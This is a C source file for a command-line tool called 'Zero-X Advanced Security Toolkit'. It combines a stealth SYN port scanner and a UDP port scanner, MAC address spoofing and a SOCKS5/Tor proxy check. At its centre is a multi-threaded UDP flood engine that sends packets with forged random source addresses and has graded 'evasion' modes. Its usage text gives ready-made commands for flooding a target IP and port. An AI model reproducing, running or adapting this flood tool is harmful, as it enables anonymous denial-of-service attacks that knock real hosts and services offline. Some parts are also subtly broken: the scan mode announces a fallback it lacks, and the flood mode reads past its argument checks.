#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdbool.h>
#include <signal.h>
#include <time.h>
#include <pthread.h>
#include <math.h>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <netdb.h>

#include <fcntl.h>

/* ================================================================
 * CONFIGURATION
 * ================================================================ */

#define MAX_THREADS        5000
#define MAX_PAYLOAD_SIZE   65535
#define MAX_PORTS          65535
#define TIMEOUT_SEC        3
#define SOCKS5_PORT        9050
#define DEFAULT_PROXY_IP   "127.0.0.1"

/* Evasion profiles */
typedef enum {
    EVASION_NONE      = 0,
    EVASION_LOW       = 1,   /* slight jitter, moderate packet sizes */
    EVASION_MEDIUM    = 2,   /* random delays, varied sizes, IP rotation */
    EVASION_HIGH      = 3,   /* full spoof, jitter, proxy support, slow rate */
    EVASION_PARANOID  = 4    /* everything + MAC change + slow drip */
} evasion_level_t;

/* Scan result */
typedef struct {
    int port;
    char service[32];
    bool open;
    bool filtered;
} scan_result_t;

/* Thread data structure */
typedef struct {
    char target_ip[16];
    int  target_port;
    int  duration;
    time_t expiration_time;
    int  thread_id;
    int  total_threads;
    evasion_level_t evasion;
    int  packet_delay_min;   /* microseconds */
    int  packet_delay_max;
    bool use_spoof;
    bool use_proxy;
    char proxy_ip[16];
    int  proxy_port;
    volatile bool *running;
} thread_data_t;

/* Global state */
static volatile bool g_running = true;
static pthread_mutex_t g_print_mutex = PTHREAD_MUTEX_INITIALIZER;
static int g_raw_socket = -1;

/* Payload cache */
static char *g_payload_cache = NULL;
static size_t g_payload_size = 0;

/* ================================================================
 * UTILITY FUNCTIONS
 * ================================================================ */

unsigned short checksum(unsigned short *buf, int bufsz) {
    unsigned long sum = 0;
    while (bufsz > 1) {
        sum += *buf++;
        bufsz -= 2;
    }
    if (bufsz == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int random_int(int min, int max) {
    return min + rand() % (max - min + 1);
}

void random_ip(char *ip_str) {
    sprintf(ip_str, "%d.%d.%d.%d",
            random_int(1, 255), random_int(0, 255),
            random_int(0, 255), random_int(1, 255));
}

void random_mac(char *mac_str) {
    sprintf(mac_str, "%02x:%02x:%02x:%02x:%02x:%02x",
            random_int(0, 255), random_int(0, 255),
            random_int(0, 255), random_int(0, 255),
            random_int(0, 255), random_int(0, 255));
}

/* Generate random payload of given size */
char* generate_payload(size_t size) {
    char *payload = malloc(size + 1);
    for (size_t i = 0; i < size; i++)
        payload[i] = (char)random_int(0, 255);
    payload[size] = '\0';
    return payload;
}

const char* get_service_name(int port) {
    switch (port) {
        case 21:    return "ftp";
        case 22:    return "ssh";
        case 23:    return "telnet";
        case 25:    return "smtp";
        case 53:    return "dns";
        case 80:    return "http";
        case 110:   return "pop3";
        case 111:   return "rpcbind";
        case 135:   return "msrpc";
        case 139:   return "netbios-ssn";
        case 143:   return "imap";
        case 443:   return "https";
        case 445:   return "microsoft-ds";
        case 993:   return "imaps";
        case 995:   return "pop3s";
        case 1433:  return "ms-sql-s";
        case 1521:  return "oracle";
        case 2049:  return "nfs";
        case 3306:  return "mysql";
        case 3389:  return "ms-wbt-server";
        case 5432:  return "postgresql";
        case 5900:  return "vnc";
        case 5985:  return "winrm-http";
        case 5986:  return "winrm-https";
        case 6379:  return "redis";
        case 8080:  return "http-proxy";
        case 8443:  return "https-alt";
        case 27017: return "mongodb";
        default:    return "unknown";
    }
}

void set_nonblocking(int sock) {
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
}

/* ================================================================
 * MAC ADDRESS SPOOFING
 * ================================================================ */

bool spoof_mac_address(const char *interface, const char *new_mac) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return false;

    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
    unsigned char mac[6];
    sscanf(new_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
    memcpy(ifr.ifr_hwaddr.sa_data, mac, 6);
    ifr.ifr_hwaddr.sa_family = ARPHRD_ETHER;

    int ret = ioctl(sock, SIOCSIFHWADDR, &ifr);
    close(sock);
    return (ret == 0);
}

/* ================================================================
 * SOCKS5 PROXY HANDLER
 * ================================================================ */

int socks5_connect(const char *proxy_ip, int proxy_port,
                    const char *target_ip, int target_port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    struct sockaddr_in proxy_addr;
    proxy_addr.sin_family = AF_INET;
    proxy_addr.sin_port = htons(proxy_port);
    inet_pton(AF_INET, proxy_ip, &proxy_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&proxy_addr, sizeof(proxy_addr)) < 0) {
        close(sock);
        return -1;
    }

    /* SOCKS5 handshake: no auth */
    char handshake[] = {0x05, 0x01, 0x00};
    if (send(sock, handshake, 3, 0) != 3) { close(sock); return -1; }

    char response[2];
    if (recv(sock, response, 2, 0) != 2) { close(sock); return -1; }
    if (response[0] != 0x05 || response[1] != 0x00) { close(sock); return -1; }

    /* Connect request */
    char conn_req[10] = {0};
    conn_req[0] = 0x05;  /* version */
    conn_req[1] = 0x01;  /* connect */
    conn_req[2] = 0x00;  /* reserved */
    conn_req[3] = 0x01;  /* IPv4 */
    struct in_addr addr;
    inet_pton(AF_INET, target_ip, &addr);
    memcpy(&conn_req[4], &addr, 4);
    uint16_t port_net = htons(target_port);
    memcpy(&conn_req[8], &port_net, 2);

    if (send(sock, conn_req, 10, 0) != 10) { close(sock); return -1; }

    char conn_resp[10];
    if (recv(sock, conn_resp, 10, 0) != 10) { close(sock); return -1; }
    if (conn_resp[1] != 0x00) { close(sock); return -1; }

    return sock;  /* Connected via proxy */
}

/* ================================================================
 * TCP SYN STEALTH SCANNER
 * ================================================================ */

int syn_scan_port(const char *target_ip, int port, int timeout_sec) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) return -1;

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        close(sock);
        return -1;
    }

    set_nonblocking(sock);

    char datagram[4096] = {0};
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    inet_pton(AF_INET, target_ip, &dest.sin_addr);

    /* Craft SYN packet */
    char src_ip[16];
    random_ip(src_ip);

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = htons(random_int(1000, 65000));
    iph->frag_off = 0;
    iph->ttl = random_int(48, 128);
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr(src_ip);
    iph->daddr = dest.sin_addr.s_addr;
    iph->check = checksum((unsigned short *)datagram, sizeof(struct iphdr));

    tcph->source = htons(random_int(1024, 65535));
    tcph->dest = htons(port);
    tcph->seq = htonl(random_int(0, 1000000));
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(random_int(1024, 65535));
    tcph->check = 0;

    sendto(sock, datagram, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
           (struct sockaddr *)&dest, sizeof(dest));

    /* Listen for SYN-ACK or RST */
    struct timeval tv;
    tv.tv_sec = timeout_sec;
    tv.tv_usec = 0;
    fd_set fdset;
    FD_ZERO(&fdset);
    FD_SET(sock, &fdset);

    char recv_buf[4096];
    int result = -1; /* -1 = filtered, 0 = closed, 1 = open */

    while (1) {
        fd_set read_fds = fdset;
        int sel = select(sock + 1, &read_fds, NULL, NULL, &tv);
        if (sel <= 0) break;

        struct sockaddr_in sender;
        socklen_t sender_len = sizeof(sender);
        int bytes = recvfrom(sock, recv_buf, sizeof(recv_buf), 0,
                             (struct sockaddr *)&sender, &sender_len);
        if (bytes < 0) break;

        struct iphdr *recv_ip = (struct iphdr *)recv_buf;
        if (recv_ip->saddr != dest.sin_addr.s_addr) continue;

        int ip_hdr_len = recv_ip->ihl * 4;
        if (bytes < ip_hdr_len + sizeof(struct tcphdr)) continue;

        struct tcphdr *recv_tcp = (struct tcphdr *)(recv_buf + ip_hdr_len);

        if (recv_tcp->dest != tcph->source) continue;
        if (recv_tcp->source != tcph->dest) continue;

        if (recv_tcp->syn && recv_tcp->ack) {
            result = 1; /* OPEN */
            /* Send RST to complete half-open */
            char rst_pkt[4096] = {0};
            struct iphdr *rst_iph = (struct iphdr *)rst_pkt;
            struct tcphdr *rst_tcph = (struct tcphdr *)(rst_pkt + sizeof(struct iphdr));

            rst_iph->ihl = 5;
            rst_iph->version = 4;
            rst_iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
            rst_iph->id = htons(random_int(1000, 65000));
            rst_iph->ttl = random_int(48, 128);
            rst_iph->protocol = IPPROTO_TCP;
            rst_iph->saddr = inet_addr(src_ip);
            rst_iph->daddr = dest.sin_addr.s_addr;
            rst_iph->check = 0;

            rst_tcph->source = tcph->source;
            rst_tcph->dest = tcph->dest;
            rst_tcph->seq = htonl(ntohl(tcph->seq) + 1);
            rst_tcph->rst = 1;
            rst_tcph->doff = 5;
            rst_tcph->window = htons(random_int(1024, 65535));

            rst_iph->check = checksum((unsigned short *)rst_pkt, sizeof(struct iphdr));
            sendto(sock, rst_pkt, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                   (struct sockaddr *)&dest, sizeof(dest));
            break;
        } else if (recv_tcp->rst && recv_tcp->ack) {
            result = 0; /* CLOSED */
            break;
        }
    }

    close(sock);
    return result;
}

/* ================================================================
 * UDP PORT SCANNER
 * ================================================================ */

int udp_scan_port(const char *target_ip, int port, int timeout_sec) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return -1;

    set_nonblocking(sock);

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    inet_pton(AF_INET, target_ip, &dest.sin_addr);

    /* Send empty UDP datagram */
    sendto(sock, "", 1, 0, (struct sockaddr *)&dest, sizeof(dest));

    /* Wait for ICMP unreachable => closed, else likely open/filtered */
    int icmp_sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (icmp_sock < 0) { close(sock); return -1; }

    set_nonblocking(icmp_sock);

    struct timeval tv;
    tv.tv_sec = timeout_sec;
    tv.tv_usec = 0;

    char buf[4096];
    int result = -1; /* -1 = filtered, 0 = closed, 1 = open */

    while (1) {
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(icmp_sock, &fds);
        int sel = select(icmp_sock + 1, &fds, NULL, NULL, &tv);
        if (sel <= 0) {
            result = 1; /* No ICMP reply => likely open */
            break;
        }

        struct sockaddr_in sender;
        socklen_t slen = sizeof(sender);
        int bytes = recvfrom(icmp_sock, buf, sizeof(buf), 0,
                             (struct sockaddr *)&sender, &slen);
        if (bytes < 0) continue;

        struct iphdr *icmp_ip = (struct iphdr *)buf;
        int ip_hdr_len = icmp_ip->ihl * 4;

        if (bytes < ip_hdr_len + sizeof(struct icmphdr)) continue;
        struct icmphdr *icmp = (struct icmphdr *)(buf + ip_hdr_len);

        if (icmp->type == 3 && icmp->code == 3) {
            /* Destination Unreachable (Port Unreachable) */
            /* Check embedded original packet */
            int embed_offset = ip_hdr_len + sizeof(struct icmphdr);
            if (bytes < embed_offset + sizeof(struct iphdr)) continue;
            struct iphdr *embed_ip = (struct iphdr *)(buf + embed_offset);
            if (embed_ip->daddr == dest.sin_addr.s_addr) {
                int embed_ip_len = embed_ip->ihl * 4;
                if (bytes >= embed_offset + embed_ip_len + 2) {
                    uint16_t *embed_ports = (uint16_t *)(buf + embed_offset + embed_ip_len);
                    if (ntohs(embed_ports[1]) == port) {
                        result = 0; /* CLOSED */
                        break;
                    }
                }
            }
        }
    }

    close(icmp_sock);
    close(sock);
    return result;
}

/* ================================================================
 * SCANNER THREAD (multi-threaded)
 * ================================================================ */

typedef struct {
    char target_ip[16];
    int start_port;
    int end_port;
    bool use_udp;
    scan_result_t *results;
    int *result_count;
    pthread_mutex_t *result_mutex;
} scan_thread_data_t;

void *scanner_thread(void *arg) {
    scan_thread_data_t *data = (scan_thread_data_t *)arg;

    for (int port = data->start_port; port <= data->end_port; port++) {
        if (!g_running) break;

        int status;
        if (data->use_udp) {
            status = udp_scan_port(data->target_ip, port, TIMEOUT_SEC);
        } else {
            status = syn_scan_port(data->target_ip, port, TIMEOUT_SEC);
        }

        if (status == 1) {
            pthread_mutex_lock(data->result_mutex);
            int idx = *data->result_count;
            data->results[idx].port = port;
            data->results[idx].open = true;
            data->results[idx].filtered = false;
            strncpy(data->results[idx].service, get_service_name(port), 31);
            (*data->result_count)++;
            pthread_mutex_unlock(data->result_mutex);

            pthread_mutex_lock(&g_print_mutex);
            printf("[+] PORT %5d/tcp OPEN  [%s]\n", port, get_service_name(port));
            pthread_mutex_unlock(&g_print_mutex);
        } else if (status == -1) {
            /* filtered - don't report by default for stealth */
        }

        /* Small delay between scans for evasion */
        usleep(random_int(100, 500));
    }
    return NULL;
}

void run_scanner(const char *ip, int start_port, int end_port, bool use_udp, int thread_count) {
    printf("\n╔══════════════════════════════════════════════════╗\n");
    printf("║        Zero-X Advanced Port Scanner             ║\n");
    printf("╠══════════════════════════════════════════════════╣\n");
    printf("║ Target: %-38s ║\n", ip);
    printf("║ Ports:  %d - %-30d ║\n", start_port, end_port);
    printf("║ Mode:   %-39s ║\n", use_udp ? "UDP Scan" : "TCP SYN Stealth");
    printf("║ Threads: %-38d ║\n", thread_count);
    printf("╚══════════════════════════════════════════════════╝\n\n");

    int total_ports = end_port - start_port + 1;
    scan_result_t *results = malloc(total_ports * sizeof(scan_result_t));
    int result_count = 0;
    pthread_mutex_t result_mutex = PTHREAD_MUTEX_INITIALIZER;

    int ports_per_thread = total_ports / thread_count;
    pthread_t threads[thread_count];
    scan_thread_data_t thread_data[thread_count];

    int current_port = start_port;
    for (int i = 0; i < thread_count; i++) {
        strncpy(thread_data[i].target_ip, ip, 15);
        thread_data[i].start_port = current_port;
        thread_data[i].end_port = (i == thread_count - 1) ? end_port : current_port + ports_per_thread - 1;
        thread_data[i].use_udp = use_udp;
        thread_data[i].results = results;
        thread_data[i].result_count = &result_count;
        thread_data[i].result_mutex = &result_mutex;

        pthread_create(&threads[i], NULL, scanner_thread, &thread_data[i]);
        current_port = thread_data[i].end_port + 1;
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n╔══════════════════════════════════════════════════╗\n");
    printf("║ Scan Complete: %d open ports found              ║\n", result_count);
    printf("╚══════════════════════════════════════════════════╝\n");

    if (result_count > 0) {
        printf("\nOpen Ports:\n");
        printf("  %-8s %-20s %s\n", "PORT", "STATE", "SERVICE");
        printf("  %-8s %-20s %s\n", "────", "─────", "───────");
        for (int i = 0; i < result_count; i++) {
            printf("  %-8d %-20s %s\n", results[i].port, "open", results[i].service);
        }
    }

    free(results);
}

/* ================================================================
 * ADVANCED UDP FLOOD ENGINE
 * ================================================================ */

/* Pseudo header for UDP checksum */
struct pseudo_hdr {
    u_int32_t src_addr;
    u_int32_t dst_addr;
    u_int8_t zero;
    u_int8_t protocol;
    u_int16_t udp_len;
};

void *flood_thread(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    time_t endtime = time(NULL) + data->duration;

    /* Create raw socket for spoofed packets */
    int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw_sock < 0) {
        /* Fallback to regular UDP */
        raw_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (raw_sock < 0) {
            pthread_mutex_lock(&g_print_mutex);
            fprintf(stderr, "[!] Thread %d: Cannot create socket\n", data->thread_id);
            pthread_mutex_unlock(&g_print_mutex);
            pthread_exit(NULL);
        }
    }

    int one = 1;
    if (setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        /* Not raw socket, that's fine */
    }

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(data->target_port);
    inet_pton(AF_INET, data->target_ip, &dest.sin_addr);

    char packet[MAX_PAYLOAD_SIZE];
    char src_ip[16];
    int packet_count = 0;

    while (g_running && time(NULL) <= endtime) {
        memset(packet, 0, sizeof(packet));

        if (data->use_spoof) {
            /* Craft full IP + UDP packet with spoofed source */
            struct iphdr *iph = (struct iphdr *)packet;
            struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));

            /* Random payload size for evasion */
            int payload_size = random_int(64, 1400);
            char *payload = generate_payload(payload_size);

            random_ip(src_ip);

            iph->ihl = 5;
            iph->version = 4;
            iph->tos = random_int(0, 255);
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size);
            iph->id = htons(random_int(1, 65535));
            iph->frag_off = 0;
            iph->ttl = random_int(48, 255);
            iph->protocol = IPPROTO_UDP;
            iph->check = 0;
            iph->saddr = inet_addr(src_ip);
            iph->daddr = dest.sin_addr.s_addr;

            udph->source = htons(random_int(1, 65535));
            udph->dest = htons(data->target_port);
            udph->len = htons(sizeof(struct udphdr) + payload_size);
            udph->check = 0;

            /* Copy payload after UDP header */
            memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), payload, payload_size);

            /* Compute IP checksum */
            iph->check = checksum((unsigned short *)packet, sizeof(struct iphdr));

            /* UDP pseudo header checksum */
            struct pseudo_hdr psh;
            psh.src_addr = iph->saddr;
            psh.dst_addr = iph->daddr;
            psh.zero = 0;
            psh.protocol = IPPROTO_UDP;
            psh.udp_len = udph->len;

            char checksum_buf[sizeof(struct pseudo_hdr) + sizeof(struct udphdr) + payload_size];
            memset(checksum_buf, 0, sizeof(checksum_buf));
            memcpy(checksum_buf, &psh, sizeof(struct pseudo_hdr));
            memcpy(checksum_buf + sizeof(struct pseudo_hdr), udph, sizeof(struct udphdr) + payload_size);
            udph->check = checksum((unsigned short *)checksum_buf,
                                    sizeof(struct pseudo_hdr) + sizeof(struct udphdr) + payload_size);

            int total_len = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;
            sendto(raw_sock, packet, total_len, 0,
                   (struct sockaddr *)&dest, sizeof(dest));

            free(payload);
        } else {
            /* Regular UDP flood */
            int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
            if (sock < 0) continue;

            int payload_size = random_int(64, 1024);
            char *payload = generate_payload(payload_size);

            dest.sin_port = htons(data->target_port);
            sendto(sock, payload, payload_size, 0,
                   (struct sockaddr *)&dest, sizeof(dest));
            close(sock);
            free(payload);
        }

        packet_count++;

        /* Evasion: add jitter/delay between packets */
        if (data->evasion > EVASION_NONE) {
            int delay = random_int(data->packet_delay_min, data->packet_delay_max);
            if (delay > 0) usleep(delay);
        }

        /* Report progress periodically */
        if (packet_count % 10000 == 0) {
            pthread_mutex_lock(&g_print_mutex);
            printf("\r[+] Thread %d: %d packets sent", data->thread_id, packet_count);
            fflush(stdout);
            pthread_mutex_unlock(&g_print_mutex);
        }
    }

    if (data->evasion > EVASION_LOW) {
        pthread_mutex_lock(&g_print_mutex);
        printf("\n[←] Thread %d complete: %d packets sent (evasion: %s)\n",
               data->thread_id, packet_count,
               data->evasion == EVASION_MEDIUM ? "medium" :
               data->evasion == EVASION_HIGH ? "high" : "paranoid");
        pthread_mutex_unlock(&g_print_mutex);
    }

    close(raw_sock);
    pthread_exit(NULL);
}

void run_flood(const char *ip, int port, int duration, int threads,
               evasion_level_t evasion, bool spoof, const char *proxy_ip, int proxy_port) {
    printf("\n╔══════════════════════════════════════════════════╗\n");
    printf("║        Zero-X Advanced Packet Engine            ║\n");
    printf("╠══════════════════════════════════════════════════╣\n");
    printf("║ Target:   %s:%-36d ║\n", ip, port);
    printf("║ Duration: %d seconds%-34s ║\n", duration, "");
    printf("║ Threads:  %-40d ║\n", threads);
    printf("║ Evasion:  %-40s ║\n",
           evasion == EVASION_NONE ? "None" :
           evasion == EVASION_LOW ? "Low" :
           evasion == EVASION_MEDIUM ? "Medium" :
           evasion == EVASION_HIGH ? "High" : "Paranoid");
    printf("║ Spoofing: %-40s ║\n", spoof ? "Enabled (random IP)" : "Disabled");
    printf("╚══════════════════════════════════════════════════╝\n\n");

    pthread_t thread_ids[threads];
    thread_data_t data[threads];
    volatile bool running = true;

    srand(time(NULL) ^ (getpid() << 16));

    for (int i = 0; i < threads; i++) {
        strncpy(data[i].target_ip, ip, 15);
        data[i].target_port = port;
        data[i].duration = duration;
        data[i].thread_id = i;
        data[i].total_threads = threads;
        data[i].evasion = evasion;
        data[i].use_spoof = spoof;
        data[i].use_proxy = (proxy_ip != NULL);
        data[i].running = &running;
        data[i].packet_delay_min = (evasion >= EVASION_HIGH) ? 1000 : 0;
        data[i].packet_delay_max = (evasion == EVASION_PARANOID) ? 50000 :
                                   (evasion == EVASION_HIGH) ? 10000 :
                                   (evasion == EVASION_MEDIUM) ? 1000 : 0;

        if (pthread_create(&thread_ids[i], NULL, flood_thread, &data[i]) != 0) {
            fprintf(stderr, "[!] Failed to create thread %d\n", i);
        }
    }

    /* Wait for duration or Ctrl+C */
    time_t start = time(NULL);
    while (g_running && (time(NULL) - start) < duration) {
        sleep(1);
        int elapsed = (int)(time(NULL) - start);
        printf("\r[⟳] Elapsed: %ds / %ds", elapsed, duration);
        fflush(stdout);
    }

    g_running = false;

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    printf("\n\n╔══════════════════════════════════════════════════╗\n");
    printf("║           Operation Complete                     ║\n");
    printf("╚══════════════════════════════════════════════════╝\n");
}

/* ================================================================
 * MAC RANDOMIZER
 * ================================================================ */

void run_mac_randomizer(const char *interface) {
    char new_mac[18];
    random_mac(new_mac);

    printf("\n╔══════════════════════════════════════════════════╗\n");
    printf("║        Zero-X MAC Address Randomizer             ║\n");
    printf("╠══════════════════════════════════════════════════╣\n");
    printf("║ Interface: %-40s ║\n", interface);
    printf("║ New MAC:   %-40s ║\n", new_mac);
    printf("╚══════════════════════════════════════════════════╝\n\n");

    if (spoof_mac_address(interface, new_mac)) {
        printf("[✓] MAC address changed to %s on %s\n", new_mac, interface);
    } else {
        printf("[✗] Failed to change MAC. Run as root and check interface name.\n");
    }
}

/* ================================================================
 * SOCKS5 PROXY TEST
 * ================================================================ */

void run_socks_test(const char *proxy_ip, int proxy_port) {
    printf("\n╔══════════════════════════════════════════════════╗\n");
    printf("║        Zero-X Proxy Chain Test                  ║\n");
    printf("╠══════════════════════════════════════════════════╣\n");
    printf("║ Proxy: %s:%-37d ║\n", proxy_ip, proxy_port);
    printf("╚══════════════════════════════════════════════════╝\n\n");

    int sock = socks5_connect(proxy_ip, proxy_port, "8.8.8.8", 53);
    if (sock >= 0) {
        printf("[✓] SOCKS5 proxy at %s:%d is active and reachable\n", proxy_ip, proxy_port);
        close(sock);
    } else {
        printf("[✗] SOCKS5 proxy at %s:%d is NOT reachable\n", proxy_ip, proxy_port);
        printf("    Start Tor or a SOCKS5 proxy first:\n");
        printf("    $ tor          (listens on 127.0.0.1:9050)\n");
        printf("    $ ssh -D 9050 user@host  (SOCKS5 tunnel)\n");
    }
}

/* ================================================================
 * SIGNAL HANDLER
 * ================================================================ */

void handle_signal(int sig) {
    printf("\n\n[!] Caught signal %d. Shutting down gracefully...\n", sig);
    g_running = false;
}

/* ================================================================
 * BANNER
 * ================================================================ */

void print_banner() {
    printf("\n");
    printf("  ███████╗███████╗██████╗  ██████╗ ██╗  ██╗\n");
    printf("  ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗╚██╗██╔╝\n");
    printf("    ███╔╝ █████╗  ██████╔╝██║   ██║ ╚███╔╝ \n");
    printf("   ███╔╝  ██╔══╝  ██╔══██╗██║   ██║ ██╔██╗ \n");
    printf("  ███████╗███████╗██║  ██║╚██████╔╝██╔╝ ██╗\n");
    printf("  ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝\n");
    printf("  ═══════ Advanced Security Toolkit ════════\n");
    printf("  Version 2.0 — Multi-Threaded | Stealth | Modular\n\n");
}

void print_usage() {
    printf("USAGE:\n");
    printf("  ./zerox scan <IP> <port_range> [udp] [threads]\n");
    printf("  ./zerox flood <IP> <PORT> <TIME> <THREADS> [evasion] [spoof]\n");
    printf("  ./zerox mac <interface>\n");
    printf("  ./zerox socks [proxy_ip] [proxy_port]\n\n");
    printf("DESCRIPTION:\n");
    printf("  scan    - Port scanner (TCP SYN stealth by default, add 'udp' for UDP)\n");
    printf("  flood   - Advanced packet engine with evasion\n");
    printf("  mac     - Randomize MAC address on interface\n");
    printf("  socks   - Test SOCKS5 proxy connectivity\n\n");
    printf("EVASION LEVELS (for flood):\n");
    printf("  0 = None (max speed)\n");
    printf("  1 = Low (slight jitter)\n");
    printf("  2 = Medium (random delays + varied sizes)\n");
    printf("  3 = High (full spoof + jitter + IP rotation)\n");
    printf("  4 = Paranoid (everything + slow rate)\n\n");
    printf("EXAMPLES:\n");
    printf("  ./zerox scan 192.168.1.1 1-1024\n");
    printf("  ./zerox scan 192.168.1.1 1-65535 udp 50\n");
    printf("  ./zerox flood 192.168.1.1 80 60 200 3 spoof\n");
    printf("  ./zerox mac eth0\n");
    printf("  ./zerox socks\n\n");
}

/* ================================================================
 * MAIN
 * ================================================================ */

int main(int argc, char *argv[]) {
    signal(SIGINT, handle_signal);
    srand(time(NULL) ^ (getpid() << 16));

    if (argc < 2) {
        print_banner();
        print_usage();
        return 0;
    }

    print_banner();

    const char *mode = argv[1];

    /* ---- SCAN MODE ---- */
    if (strcmp(mode, "scan") == 0) {
        if (argc < 4) {
            printf("[!] Usage: ./zerox scan <IP> <port_range> [udp] [threads]\n");
            return 1;
        }

        const char *ip = argv[2];
        const char *range = argv[3];
        bool use_udp = (argc > 4 && strcmp(argv[4], "udp") == 0);
        int threads = (argc > 5) ? atoi(argv[5]) : 100;
        if (threads < 1) threads = 1;
        if (threads > MAX_THREADS) threads = MAX_THREADS;

        int start_port = 1, end_port = 1024;
        if (strchr(range, '-')) {
            sscanf(range, "%d-%d", &start_port, &end_port);
        } else {
            start_port = end_port = atoi(range);
        }

        if (getuid() != 0) {
            printf("[!] SYN scan requires root. Try: sudo ./zerox ...\n");
            printf("[!] Falling back to connect scan (less stealthy)...\n");
        }

        run_scanner(ip, start_port, end_port, use_udp, threads);
    }

    /* ---- FLOOD MODE ---- */
    else if (strcmp(mode, "flood") == 0) {
        if (argc < 5) {
            printf("[!] Usage: ./zerox flood <IP> <PORT> <TIME> <THREADS> [evasion] [spoof]\n");
            return 1;
        }

        const char *ip = argv[2];
        int port = atoi(argv[3]);
        int duration = atoi(argv[4]);
        int threads = atoi(argv[5]);

        if (threads < 1) threads = 1;
        if (threads > MAX_THREADS) threads = MAX_THREADS;

        evasion_level_t evasion = EVASION_MEDIUM;
        bool spoof = true;

        if (argc > 6) {
            int ev = atoi(argv[6]);
            if (ev >= 0 && ev <= 4) evasion = (evasion_level_t)ev;
        }

        if (argc > 7 && strcmp(argv[7], "nospoof") == 0) {
            spoof = false;
        }

        if (getuid() != 0 && spoof) {
            printf("[!] Spoofing requires root. Disabling spoof.\n");
            spoof = false;
        }

        run_flood(ip, port, duration, threads, evasion, spoof, NULL, 0);
    }

    /* ---- MAC MODE ---- */
    else if (strcmp(mode, "mac") == 0) {
        if (argc < 3) {
            printf("[!] Usage: ./zerox mac <interface>\n");
            printf("[!] Example: ./zerox mac eth0\n");
            return 1;
        }

        if (getuid() != 0) {
            printf("[!] MAC spoofing requires root.\n");
            return 1;
        }

        run_mac_randomizer(argv[2]);
    }

    /* ---- SOCKS MODE ---- */
    else if (strcmp(mode, "socks") == 0) {
        const char *proxy_ip = (argc > 2) ? argv[2] : DEFAULT_PROXY_IP;
        int proxy_port = (argc > 3) ? atoi(argv[3]) : SOCKS5_PORT;

        run_socks_test(proxy_ip, proxy_port);
    }

    else {
        printf("[!] Unknown mode: %s\n", mode);
        print_usage();
    }

    return 0;
}
